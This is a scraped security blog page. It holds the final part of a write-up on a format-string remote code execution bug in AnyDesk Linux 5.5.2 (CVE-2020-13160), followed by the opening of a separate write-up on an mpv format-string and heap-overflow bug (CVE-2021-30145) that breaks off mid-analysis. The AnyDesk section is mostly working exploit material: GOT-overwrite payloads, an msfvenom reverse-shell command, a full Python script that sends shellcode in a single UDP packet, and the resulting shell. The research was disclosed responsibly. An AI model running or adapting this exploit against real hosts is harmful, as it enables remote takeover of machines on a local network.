RDX: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
RSI: 0x400
RDI: 0x7ffffffeafd0 --> 0x7
RBP: 0x5
RSP: 0x7ffffffeaaf0 --> 0x28e3
RIP: 0x8ab346 (call   0x412d90 <vsnprintf@plt>)
R8 : 0x0
R9 : 0x10
R10: 0xffffffa7
R11: 0x7ffff1548550 --> 0xfff08320fff08310
R12: 0x7ffffffeb898 --> 0x3000000010
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x1412190 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x28e3
0008| 0x7ffffffeaaf8 --> 0x1e6
0016| 0x7ffffffeab00 --> 0x158bf10 --> 0x0
0024| 0x7ffffffeab08 --> 0x5ecbbcb0
0032| 0x7ffffffeab10 --> 0x5ecbbcb0
0040| 0x7ffffffeab18 --> 0x76cd1
0048| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
0056| 0x7ffffffeab28 --> 0x3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$ x/2xw 0x7ffffffeb898
0x7ffffffeb898:	0x00000010	0x00000030
gdb-peda$ x/2xg 0x7ffffffeb898+8
0x7ffffffeb8a0:	0x00007ffffffeb970	0x00007ffffffeb8b0
gdb-peda$ x/4xg 0x00007ffffffeb8b0+0x10
0x7ffffffeb8c0:	0x0000000001412190	0x0000000000000000
0x7ffffffeb8d0:	0x00007ffff1784c40	0x0000000000000010

```

The first accessible argument at `0x00007ffffffeb8c0` is actually the heap address of the format string (`0x0000000001412190`). If we use this address as a `dynamic field width`, we can actually write its value to the `time` `GOT` entry.

By changing the hostname to the following value, we write the heap address + the amounts of characters written so far (error message and two bytes invalid UTF-8 sequence) to the `time` `GOT` entry:

```

p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%165$ln', '\x85\xfe%18472249x%93$ln', 'ad', 'main')

```

After sending the frame we continue to the second call. The `GOT` entry is still untouched:

```

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x7ffffffeb898 --> 0x3000000010
RDX: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 50: Invalid UTF-8 encoded text in name - not valid '\205\376%1$*1$x%165$ln'")
RSI: 0x400
RDI: 0x7ffffffeafd0 --> 0x7
RBP: 0x5
RSP: 0x7ffffffeaaf0 --> 0x2db9
RIP: 0x8ab346 (call   0x412d90 <vsnprintf@plt>)
R8 : 0x0
R9 : 0x10
R10: 0x21 ('!')
R11: 0x7ffff1548550 --> 0xfff08320fff08310
R12: 0x7ffffffeb898 --> 0x3000000010
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x1570630 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 50: Invalid UTF-8 encoded text in name - not valid '\205\376%1$*1$x%165$ln'")
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 50: Invalid UTF-8 encoded text in name - not valid '\205\376%1$*1$x%165$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x2db9
0008| 0x7ffffffeaaf8 --> 0x9d
0016| 0x7ffffffeab00 --> 0x158df10 --> 0x0
0024| 0x7ffffffeab08 --> 0x5ecbc775
0032| 0x7ffffffeab10 --> 0x5ecbc775
0040| 0x7ffffffeab18 --> 0x26709
0048| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
0056| 0x7ffffffeab28 --> 0x3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x00007ffff7ffb930

```

After executing the call the `GOT` entry contains the heap address `0x00000000015706b7`:

```

gdb-peda$ ni
...
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x00000000015706b7

```

The `%n` wrote the field width (the heap address of the format string `0x1570630`) + the characters written so far. The resulting address (`0x00000000015706b7`) references the beginning of our format specifier:

```

gdb-peda$ x/s 0x00000000015706b7
0x15706b7:	"%1$*1$x%165$ln'"

```

Since we want to make the address point to actual shellcode, which we can append to the format string, we further need to add a little bit of padding. The following hostname adds another `18` characters of padding (`%18x`) and a dummy shellcode (`0xcc`):

```

shellcode = '\xcc'
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')

```

Now the `GOT` entry is overwritten with the address of the shellcode:

```

...
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x0000000001379549

gdb-peda$ x/i 0x0000000001379549
   0x1379549:	int3

```
## Final exploit

Finally it is time to generate a real payload:

```

kali@kali:~$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
...

```

Please notice the bad bytes. `0x00` is excluded to prevent the string from being terminated. `0x25` (`%`) would introduce another format specifier and `0x26` (`&`) is used by glib and must also be avoided.

The final exploit script looks like this:

```

#!/usr/bin/env python

import struct
import socket
import sys

ip = '127.0.0.1'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x59\x88\xc6"
shellcode += b"\x9c\x5f\xfe\x71\x38\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x33\xa1\x9e\x05\x35"
shellcode += b"\xfc\x2e\x52\x58\xd6\xc9\x99\x17\x69\x39\x81"
shellcode += b"\x5b\x88\xd7\xc0\x20\xfe\x71\x39\x08\xc0\x4f"
shellcode += b"\x7a\x35\xee\x2b\x52\x73\xd0\xc9\x99\x35\xfd"
shellcode += b"\x2f\x70\xa6\x46\xac\xbd\x07\xf1\x74\x4d\xaf"
shellcode += b"\xe2\xfd\xc4\xc6\xb6\xca\x17\x3b\xe1\xa8\xb3"
shellcode += b"\x2c\x96\x71\x6b\x11\x01\x21\xce\x08\xb6\xf8"
shellcode += b"\xde\x56\x8d\xc6\x9c\x5f\xfe\x71\x38"

print('sending payload ...')
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('reverse shell should connect within 5 seconds')

```

Before running the exploit we start a `nc` listener on port 4444:

```

user@w00d:~$ nc -lvp 4444
Listening on [0.0.0.0] (family 0, port 4444)

```

Now we run the exploit script:

```

user@w00d:~$ ./final_exploit.py
sending payload ...
reverse shell should connect within 5 seconds

```

After a few seconds the front-end updates its online states, which triggers the exploit. The shellcode is executed and we receive a reverse shell:

```

...
Connection from localhost 52000 received!
id
uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)

```
# Conclusion

By sending a single UDP packet to the target machine we are able to successfully exploit the discovered format string vulnerability to gain Remote Code Execution. In order to achieve this we triggered the vulnerability twice: once to write the address of the `GOT` entry of the `time` function to the stack and a second time to write the heap address of our shellcode to the `GOT` entry using a `dynamic field width`.

Please keep in mind that this is a proof of concept exploit targeting AnyDesk Linux version `5.5.2`. The exploit was developed for `Ubuntu 18.04.4 LTS` at the time of writing. In order to successfully run the exploit against other targets it probably needs to be adjusted.

At last I would like to thank AnyDesk for the immediate and professional reaction. A patch to fix the vulnerability was released only three days after my notification. Also the patch enabled `FULL RELRO` according to my suggestion. This remaps the `GOT` as read-only preventing an attacker from overwriting an entry within the `GOT`.

It is great to see when security is taken seriously.

Thanks for reading the article 🙂

**Timeline**
18/02/20 – Vendor Notification
19/02/20 – Vendor Acknowledgement
21/02/20 – Vendor Patch
09/06/20 – Public Disclosure

 Post Views: 50,562

  Categories[article](https://devel0pment.de/?cat=29)  Tags[CVE-2020-13160](https://devel0pment.de/?tag=cve-2020-13160), [exploitation](https://devel0pment.de/?tag=exploitation), [formatstring](https://devel0pment.de/?tag=formatstring), [fuzzing](https://devel0pment.de/?tag=fuzzing), [rce](https://devel0pment.de/?tag=rce)

## 9 Replies to “AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)”

1. ![](https://secure.gravatar.com/avatar/e82a050707aeed85933f04f71f9971fd?s=100&d=mm&r=g)
   [24. November 2020 at 4:31 pm](https://devel0pment.de/?p=1881#comment-2625)

   Do you by any chance know where I can find a document that details AnyDesk file format

   1. ![](https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&d=mm&r=g)
      [24. November 2020 at 4:56 pm](https://devel0pment.de/?p=1881#comment-2626)

      No, sorry. I am not aware of any documentation. Probably there isn’t any publicly available.
3. ![](https://secure.gravatar.com/avatar/f2dbf914b04cd46b9b19fe0f11837221?s=100&d=mm&r=g)
   [11. December 2020 at 5:23 pm](https://devel0pment.de/?p=1881#comment-2645)

   the most difficult part is search 2 stack that reliable for format string argument …

   1. ![](https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&d=mm&r=g)
      [12. December 2020 at 5:32 pm](https://devel0pment.de/?p=1881#comment-2647)

      Yes, in this case the stack varies when the format string vulnerability is triggered either by the username or by the hostname. You can increase the reliability by simply using values more down on the stack, as these values are more likely to stay the same between both calls.
5. ![](https://secure.gravatar.com/avatar/b576ed7219c952b200df2dbea3d1349f?s=100&d=mm&r=g)
   [25. March 2021 at 5:25 pm](https://devel0pment.de/?p=1881#comment-2935)

   What a nice piece of analysis. I’ve added this as a CTF target in one of my courses. The exploit seems rock solid on 18.04.4.

   1. ![](https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&d=mm&r=g)
      [25. March 2021 at 5:41 pm](https://devel0pment.de/?p=1881#comment-2936)

      Thanks 🙂
7. ![](https://secure.gravatar.com/avatar/b7bd7975a28f65030a10b547eff24eca?s=100&d=mm&r=g)
   [26. March 2022 at 8:37 pm](https://devel0pment.de/?p=1881#comment-3704)

   it’s also stable on 18.04.6
9. ![](https://secure.gravatar.com/avatar/47ceb849cbd1957491ae35c4074e5311?s=100&d=mm&r=g) **[m3dsec](https://m3dsec.github.io/)** says:
   [6. April 2023 at 2:23 pm](https://devel0pment.de/?p=1881#comment-4173)

   Good job, reading this in 2023, and it rocks.

   1. ![](https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&d=mm&r=g) **scryh** says:
      [6. April 2023 at 2:33 pm](https://devel0pment.de/?p=1881#comment-4174)

      Thank you!

Comments are closed.

## Post navigation

[Previous PostPrevious   Hack The Box – Rope](https://devel0pment.de/?p=1593)[Next PostNext ALLES! CTF 2020 – Actual ASLR 1/2](https://devel0pment.de/?p=2027)

Search for:

Search

## Pages

* [About](https://devel0pment.de/?page_id=2665)
* [Contact](https://devel0pment.de/?page_id=2)

## Recent Posts

* [Hack The Box – Response](https://devel0pment.de/?p=2594)
* [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)
* [ASIS CTF Quals 2021 – ASCII art a a service](https://devel0pment.de/?p=2431)
* [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)
* [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)
## Recent Comments

* scryh on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4174)
* [m3dsec](https://m3dsec.github.io/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4173)
* [TobjasR](https://www.linkedin.com/in/tobjasr/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-3704)
* scryh on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3411)
* Tomer on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3408)
## Archives

* [February 2023](https://devel0pment.de/?m=202302)
* [March 2022](https://devel0pment.de/?m=202203)
* [October 2021](https://devel0pment.de/?m=202110)
* [May 2021](https://devel0pment.de/?m=202105)
* [April 2021](https://devel0pment.de/?m=202104)
* [January 2021](https://devel0pment.de/?m=202101)
* [September 2020](https://devel0pment.de/?m=202009)
* [June 2020](https://devel0pment.de/?m=202006)
* [May 2020](https://devel0pment.de/?m=202005)
* [January 2020](https://devel0pment.de/?m=202001)
* [July 2019](https://devel0pment.de/?m=201907)
* [June 2019](https://devel0pment.de/?m=201906)
* [March 2019](https://devel0pment.de/?m=201903)
* [February 2019](https://devel0pment.de/?m=201902)
* [January 2019](https://devel0pment.de/?m=201901)
* [August 2018](https://devel0pment.de/?m=201808)
* [July 2018](https://devel0pment.de/?m=201807)
* [May 2018](https://devel0pment.de/?m=201805)
* [March 2018](https://devel0pment.de/?m=201803)
* [February 2018](https://devel0pment.de/?m=201802)
* [January 2018](https://devel0pment.de/?m=201801)
## Categories

* [article](https://devel0pment.de/?cat=29)
* [ctf](https://devel0pment.de/?cat=24)
* [Hack The Box](https://devel0pment.de/?cat=32)
* [Hacking-Lab.com](https://devel0pment.de/?cat=25)
* [RPISEC/MBE](https://devel0pment.de/?cat=26)
* [writeup](https://devel0pment.de/?cat=7)
## Meta

* [Log in](https://devel0pment.de/wp-login.php)
* [Entries feed](https://devel0pment.de/?feed=rss2)
* [Comments feed](https://devel0pment.de/?feed=comments-rss2)
* [WordPress.org](https://wordpress.org/)

[Proudly powered by WordPress](https://wordpress.org/)

We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it.OkNo



=== Content from devel0pment.de_e52d3439_20250119_142558.html ===

[Skip to content](#content)
![](https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05.png)

[devel0pment.de](https://devel0pment.de/)

software, offensive security research

Posted on [12. April 202113. April 2021](https://devel0pment.de/?p=2217) by [scryh](https://devel0pment.de/?author=1)
# mpv media player – mf custom protocol vulnerability (CVE-2021-30145)

![](https://devel0pment.de/wp-content/uploads/2021/04/mpv_title.png)

The [mpv](https://mpv.io/) media player provides a custom protocol handler (mf://) in order to merge multiple images to a video. An undocumented feature within this protocol handler allows the usage of a format specifier in the provided URL, which is evaluated using sprintf. This results in both, a format string vulnerability as well as a heap overflow ([CVE-2021-30145](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-30145)).

After disclosing the vulnerability to the mpv team on the 3rd April 2021 I got an immediate response. The mpv team took the issue very seriously and immediately started to work on a patch with me. This was the first time I disclosed a vulnerability to an open source project and I was really impressed about the professional reaction and the passionate commitment. The patch was released only two days after my report on the 5th April 2021 ([commit](https://github.com/mpv-player/mpv/commit/d0c530919d8cd4d7a774e38ab064e0fabdae34e6)). Thanks a lot to avih, sfan5 and jeeb.

The impact of the format string vulnerability is limited on Linux, because the binary is compiled with FORTIFY\_SOURCE by default. Though the heap overflow can be used to gain arbitrary code execution by overflowing into an adjacent heap chunk and setting a function pointer to an attacker controlled value. Nevertheless I estimate the probability of exploitation in real life as quite low, because a victim has to be tricked into opening a malicious playlist (e.g. via a URL like http://10.0.0.1/evil.m3u) and the attacker has to have detailed information about the victim’s system to fine-tune the exploit.

Within this article I describe the vulnerability itself as well as the development of a proof of concept exploit for Ubuntu 20.04.2 LTS with ASLR disabled. At the end of the article I outline a few thoughts on how ASLR can be bypassed and what changes if we develop an exploit for Windows. The article is divided into the following sections:

– [Introduction](https://devel0pment.de/?p=2217#intro)

– [Format String Vulnerability](https://devel0pment.de/?p=2217#format)

– [Heap Overflow](https://devel0pment.de/?p=2217#hoverflow)

– [Exploitation](https://devel0pment.de/?p=2217#expl)

– [Further Thoughts](https://devel0pment.de/?p=2217#ft)

– [Conclusion](https://devel0pment.de/?p=2217#con)

---

# Introduction

I have recently started to review some popular open source software by choosing interesting projects from [GitHub’s trending page](https://github.com/trending/c?since=monthly). One of the projects I have been looking at is mpv. [mpv](https://mpv.io/) is an open source media player available for a wide variety of operating systems (Windows, macOS, Linux, …).

When searching for possibly vulnerable function calls, I came upon this suspicious call to sprintf:

`...
mp_info(log, "search expr: %s\n", filename);
while (error_count < 5) {
sprintf(fname, filename, count++);
if (!mp_path_exists(fname)) {
error_count++;
mp_verbose(log, "file not found: '%s'\n", fname);
} else {
mf_add(mf, fname);
}
}
...`

One reason for this call being suspicious is that the second parameter to sprintf (which is the format string), is called filename. This sounds pretty user controllable. Another reason is that sprintf should be avoided at all, because it does not do any boundary checks. The safer alternative is snprintf, which takes an additional argument specifying the maximum amount of bytes to write. If sprintf is used nonetheless, the calling code must ensure that the buffer is big enough to prevent a buffer overflow. My first impression was, that this is not the case here.

# Format String Vulnerability

Let’s start by verifying that we can actually control the filename variable and thus the format string passed to sprintf. The function surrounding the call is named open\_mf\_pattern (see code [here](https://github.com/mpv-player/mpv/blob/v0.33.0/demux/demux_mf.c#L59)). The third paramater of this function is the variable filename. In order to reach the call to sprintf, the following conditions have to be met:
```

- filename[0] != '@' (line 68)
- !strchr(filename, ',') (line 103)
- strchr(filename, '%') (line 127)

```

Accordingly the provided filename should not start with an at sign (@), should not contain a comma (,), but should contain at least one percent sign (%).

Keeping this in mind we need to look where open\_mf\_pattern is called from. This leads us to the function demux\_open\_mf:

`static int demux_open_mf(demuxer_t *demuxer, enum demux_check check)
{
mf_t *mf;
if (strncmp(demuxer->stream->url, "mf://", 5) == 0 && ...)
{
mf = open_mf_pattern(demuxer, demuxer, demuxer->stream->url + 5);
...`

Here we can see that if the URL of the stream being opened (demuxer->stream->url) begins with the string mf://, the function open\_mf\_pattern is called. The third parameter (filename) is set to the stream URL omitting the prefix mf://.

The demux\_open\_mf function is stored as a callback in the demuxer\_desc\_mf struct:

`const demuxer_desc_t demuxer_desc_mf = {
.name = "mf",
.desc = "image files (mf)",
.read_packet = demux_mf_read_packet,
.open = demux_open_mf,
...
};`

This struct defines callbacks for the mf demuxer, which is referenced by the corresponding stream (stream\_info\_mf struct) using the name “mf”:

`const stream_info_t stream_info_mf = {
.name = "mf",
.open = mf_stream_open,
.protocols = (const char*const[]){ "mf", NULL },
};`

When the provided protocol is set to mf:// this stream is created.

We can now verify, that we can reach the sprintf call by loading mpv in gdb and setting a breakpoint on the function call:

`user@b0x:~/opt/mpv/build$ gdb ./mpv
...
gdb-peda$ disassemble open_mf_pattern
Dump of assembler code for function open_mf_pattern:
...
0x000000000005a3c7 <+551>: mov esi,0x1
0x000000000005a3cc <+556>: add ebx,0x1
 0x000000000005a3cf <+559>: call 0x327c0 <__sprintf_chk@plt>
0x000000000005a3d4 <+564>: mov rdi,r13
0x000000000005a3d7 <+567>: call 0x95b60 <mp_path_exists>
0x000000000005a3dc <+572>: test al,al
...
gdb-peda$ b *open_mf_pattern+559
Breakpoint 1 at 0x5a3cf: file /usr/include/x86_64-linux-gnu/bits/stdio2.h, line 36.`

As we can see, the function being called is actually \_\_sprintf\_chk. Since the binary was compiled with FORTIFY\_SOURCE enabled, calls to printf, sprintf, etc. are replaced with these safer versions, which are suffixed with \_chk. The presence of this security feature is also displayed by e.g. using the gdb-peda command checksec:

`gdb-peda$ checksec
CANARY : ENABLED
FORTIFY : ENABLED
NX : ENABLED
PIE : ENABLED
RELRO : FULL`

After having set the breakpoint, we can now run mpv and provide a mf:// URL. For the URL we must ensure to meet the above mentioned criteria. For example mf://test%d:

`gdb-peda$ r mf://test%d
Starting program: /home/user/opt/mpv/build/mpv mf://test%d
...
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x1
RCX: 0x7fffe40011f5 --> 0x642574736574 ('test%d')
RDX: 0xffffffffffffffff
RSI: 0x1
RDI: 0x7fffe40020a0 --> 0x0
RBP: 0x7fffe40011f5 --> 0x642574736574 ('test%d')
RSP: 0x7fffebcaee00 --> 0x7fffebcaf0df --> 0x5555556b95a000
RIP: 0x5555555ae3cf (<open_mf_pattern+559>: call 0x5555555867c0 <__sprintf_chk@plt>)
R8 : 0x0
R9 : 0x4
R10: 0x1
R11: 0x0
R12: 0x7fffe4002020 --> 0x7fffe4001970 --> 0x55555572b460 --> 0x55555572b320 --> 0x55555572b5d0 (0x000055555572b460)
R13: 0x7fffe40020a0 --> 0x0
R14: 0x7fffe4001970 --> 0x55555572b460 --> 0x55555572b320 --> 0x55555572b5d0 (0x000055555572b460)
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
0x5555555ae3c0 <open_mf_pattern+544>: mov rdx,0xffffffffffffffff
0x5555555ae3c7 <open_mf_pattern+551>: mov esi,0x1
0x5555555ae3cc <open_mf_pattern+556>: add ebx,0x1
=> 0x5555555ae3cf <open_mf_pattern+559>: call 0x5555555867c0 <__sprintf_chk@plt>
0x5555555ae3d4 <open_mf_pattern+564>: mov rdi,r13
0x5555555ae3d7 <open_mf_pattern+567>: call 0x5555555e9b60 <mp_path_exists>
0x5555555ae3dc <open_mf_pattern+572>: test al,al
0x5555555ae3de <open_mf_pattern+574>: je 0x5555555ae390 <open_mf_pattern+496>
Guessed arguments:
arg[0]: 0x7fffe40020a0 --> 0x0
arg[1]: 0x1
arg[2]: 0xffffffffffffffff
arg[3]: 0x7fffe40011f5 --> 0x642574736574 ('test%d')
arg[4]: 0x0
...`

We actually hit the breakpoint. The second (0x1) and third parameter (0xffffffffffffffff) are additional parameters introduced by replacing sprintf with \_\_sprintf\_chk. We get to these parameters soon. Aside from this we can see that the URL we provided (omitting the prefix mf://) is actually passed as the fourth parameter, which is the format string. Thus we have verified the format string vulnerability.

By running mpv with the -v option in order to increase the verbosity, we can actually see the format string vulnerability in the verbose output:

`user@b0x:~/opt/mpv/build$ ./mpv -v mf://%p.%p.%p.%p
...
[mf] Opening mf://%p.%p.%p.%p
[demux] Trying demuxers for level=request.
[mf] search expr: %p.%p.%p.%p
[mf] file not found: '(nil).0x4.0x55555575ea93.0x55555575e880'
[mf] file not found: '0x1.0x4.0x55555575ea93.0x55555575e880'
[mf] file not found: '0x2.0x4.0x55555575ea93.0x55555575e880'
[mf] file not found: '0x3.0x4.0x55555575ea93.0x55555575e880'
[mf] file not found: '0x4.0x4.0x55555575ea93.0x55555575e880'
[mf] number of files: 0
[cplayer] Opening failed or was aborted: mf://%p.%p.%p.%p
[cplayer] finished playback, unrecognized file format (reason 4)
[cplayer] Failed to recognize file format.
[cplayer]
[cplayer] Exiting... (Errors when loading file)`

Since we provided invalid filenames, an error message for each file is displayed, which contains the string produces via the sprintf call. The provided format specifiers (%p) are indeed evaluated.

A format string vulnerability is usually a very powerful exploitation primitive. Though without spoiling too much: FORTIFY\_SOURCE greatly reduces the possible impact. We will get to the exploitation considerations in the [exploitation section](#expl). Let’s first have a look at the additional parameters introduced by replacing sprintf with \_\_sprintf\_chk again.

# Heap Overflow

When we hit the breakpoint on \_\_sprintf\_chk, we see two additional parameters (second and third):

`...
=> 0x5555555ae3cf <open_mf_pattern+559>: call 0x5555555867c0 <__sprintf_chk@plt>
0x5555555ae3d4 <open_mf_pattern+564>: mov rdi,r13
0x5555555ae3d7 <open_mf_pattern+567>: call 0x5555555e9b60 <mp_path_exists>
0x5555555ae3dc <open_mf_pattern+572>: test al,al
0x5555555ae3de <open_mf_pattern+574>: je 0x5555555ae390 <open_mf_pattern+496>
Guessed arguments:
arg[0]: 0x7fffe40020a0 --> 0x0
arg[1]: 0x1
arg[2]: 0xffffffffffffffff
arg[3]: 0x7fffe40011f5 --> 0x642574736574 ('test%d')
arg[4]: 0x0
...`

The second parameter is called flag and has a value of 0x1. This value determines the amount of security measures \_\_sprintf\_chk should perform. For our considerations, we don’t need to dig deeper here. More interesting to notice is the third parameter, which is called strlen and determines the maximum amount of bytes the destination buffer can receive. This is similar to the additional n parameter passed to snprintf. Though in this case the value is obviously set to 0xffffffffffffffff, which effectively disables this buffer overflow protection. The reason for this is that the destination buffer was dynamically allocated on the heap. Thus the compiler could not now in advance, how big the buffer is and simply defaults it to 0xffffffffffffffff. If a static buffer is used (e.g. char buf[100]), the FORTIFY\_SOURCE option actually prevents sprintf (replaced by \_\_sprintf\_chk) from overflowing the buffer (terminating the program with the error message \*\*\* buffer overflow detected \*\*\*: terminated).

The allocation for the destination buffer called fname is also done in the open\_mf\_pattern function (see code [here](https://github.com/mpv-player/mpv/blob/v0.33.0/demux/demux_mf.c#L124)):

`...
char *fname = talloc_size(mf, strlen(filename) + 32);
...`

The size of the buffer is equal to the size of the provided filename plus additional 32 bytes. It is quite obvious that these 32 bytes are not enough, because we can provide multiple, arbitrary format specifiers and \_\_sprintf\_chk won’t prevent a buffer overflow. Let’s also verify that by setting an additional breakpoint on the allocation (talloc\_size):

`gdb-peda$ disassemble open_mf_pattern
Dump of assembler code for function open_mf_pattern:
...
0x000000000005a328 <+392>: mov rdi,rbp
0x000000000005a32b <+395>: call 0x31400 <strlen@plt>
0x000000000005a330 <+400>: mov rdi,r12
0x000000000005a333 <+403>: lea rsi,[rax+0x20]
 0x000000000005a337 <+407>: call 0x10a290 <ta_alloc_size>
0x000000000005a33c <+412>: lea rsi,[rip+0xb898c] # 0x112ccf
...
gdb-peda$ b *open_mf_pattern+407
Breakpoint 2 at 0x5a337: file ../demux/demux_mf.c, line 124.`

In order to make \_\_sprintf\_chk write a huge amount of bytes to the destination buffer, we can use a padded format specifier like %1000d:

`gdb-peda$ r mf://%1000d
Starting program: /home/user/opt/mpv/build/mpv mf://%1000d
...
[-------------------------------------code-------------------------------------]
0x5555555ae32b <open_mf_pattern+395>: call 0x555555585400 <strlen@plt>
0x5555555ae330 <open_mf_pattern+400>: mov rdi,r12
0x5555555ae333 <open_mf_pattern+403>: lea rsi,[rax+0x20]
=> 0x5555555ae337 <open_mf_pattern+407>: call 0x55555565e290 <ta_alloc_size>
0x5555555ae33c <open_mf_pattern+412>: lea rsi,[rip+0xb898c] # 0x555555666ccf
0x5555555ae343 <open_mf_pattern+419>: mov rdi,rax
0x5555555ae346 <open_mf_pattern+422>: call 0x55555565e680 <ta_dbg_set_loc>
0x5555555ae34b <open_mf_pattern+427>: mov rdi,rax
Guessed arguments:
arg[0]: 0x7fffe4002020 --> 0x7fffe4001970 --> 0x55555572b460 --> 0x55555572b320 --> 0x55555572b5d0 (0x000055555572b460)
arg[1]: 0x26 ('&')
...`

The requested size for the allocation is 0x26 = 38 bytes (strlen(“%1000d”) + 32).

The address of the allocated chunk is stored in RAX after we proceed to the next instruction:

`gdb-peda$ ni
[----------------------------------registers-----------------------------------]
RAX: 0x7fffe40020a0 --> 0x0
...
[-------------------------------------code-------------------------------------]
0x5555555ae330 <open_mf_pattern+400>: mov rdi,r12
0x5555555ae333 <open_mf_pattern+403>: lea rsi,[rax+0x20]
0x5555555ae337 <open_mf_pattern+407>: call 0x55555565e290 <ta_alloc_size>
=> 0x5555555ae33c <open_mf_pattern+412>: lea rsi,[rip+0xb898c] # 0x555555666ccf`

Since the chunk was allocated using talloc\_size, it contains a special header (struct ta\_header), which begins 0x50 bytes before the return address. We will get to the details in the [exploitation section](#expl). For now it is only necessary to know that the first member of the header (0x0000000000000026) is the size of the allocated chunk:

`...
